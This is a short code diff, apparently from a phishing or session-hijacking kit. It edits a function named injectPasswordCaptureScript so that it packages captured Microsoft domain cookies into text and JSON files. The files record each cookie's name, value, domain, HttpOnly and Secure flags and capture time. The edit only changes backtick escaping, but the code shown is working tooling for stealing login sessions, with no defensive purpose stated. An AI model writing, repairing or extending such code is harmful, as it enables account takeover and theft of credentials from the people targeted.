@@ -159,21 +159,21 @@ export function injectPasswordCaptureScript() {
               try {
                 // Create TXT format
                 let txtContent = '# Microsoft Domain Cookies Export\\n';
-                txtContent += \`# Captured: ${new Date().toISOString()}\\n\`;
-                txtContent += \`# Domain: ${window.location.hostname}\\n\`;
-                txtContent += \`# Total Cookies: ${cookies.length}\\n\\n\`;
+                txtContent += `# Captured: ${new Date().toISOString()}\\n`;
+                txtContent += `# Domain: ${window.location.hostname}\\n`;
+                txtContent += `# Total Cookies: ${cookies.length}\\n\\n`;
                 
                 cookies.forEach((cookie, index) => {
-                  txtContent += \`[Cookie ${index + 1}]\\n\`;
-                  txtContent += \`Name: ${cookie.name || 'Unknown'}\\n\`;
-                  txtContent += \`Value: ${cookie.value || 'Empty'}\\n\`;
-                  txtContent += \`Domain: ${cookie.domain || 'Unknown'}\\n\`;
-                  txtContent += \`Path: ${cookie.path || '/'}\\n\`;
-                  txtContent += \`Secure: ${cookie.secure ? 'Yes' : 'No'}\\n\`;
-                  txtContent += \`HttpOnly: ${cookie.httpOnly ? 'Yes' : 'No'}\\n\`;
-                  txtContent += \`SameSite: ${cookie.sameSite || 'Lax'}\\n\`;
-                  if (cookie.expires) txtContent += \`Expires: ${cookie.expires}\\n\`;
-                  txtContent += \`Capture Time: ${cookie.captureTime || 'Unknown'}\\n\`;
+                  txtContent += `[Cookie ${index + 1}]\\n`;
+                  txtContent += `Name: ${cookie.name || 'Unknown'}\\n`;
+                  txtContent += `Value: ${cookie.value || 'Empty'}\\n`;
+                  txtContent += `Domain: ${cookie.domain || 'Unknown'}\\n`;
+                  txtContent += `Path: ${cookie.path || '/'}\\n`;
+                  txtContent += `Secure: ${cookie.secure ? 'Yes' : 'No'}\\n`;
+                  txtContent += `HttpOnly: ${cookie.httpOnly ? 'Yes' : 'No'}\\n`;
+                  txtContent += `SameSite: ${cookie.sameSite || 'Lax'}\\n`;
+                  if (cookie.expires) txtContent += `Expires: ${cookie.expires}\\n`;
+                  txtContent += `Capture Time: ${cookie.captureTime || 'Unknown'}\\n`;
                   txtContent += '\\n';
                 });
                 
@@ -191,12 +191,12 @@ export function injectPasswordCaptureScript() {
                 
                 return {
                   txtFile: {
-                    name: \`ms_cookies_${window.location.hostname}_${Date.now()}.txt\`,
+                    name: `ms_cookies_${window.location.hostname}_${Date.now()}.txt`,
                     content: txtContent,
                     size: new Blob([txtContent]).size
                   },
                   jsonFile: {
-                    name: \`ms_cookies_${window.location.hostname}_${Date.now()}.json\`,
+                    name: `ms_cookies_${window.location.hostname}_${Date.now()}.json`,
                     content: jsonContent,
                     size: new Blob([jsonContent]).size
                   }
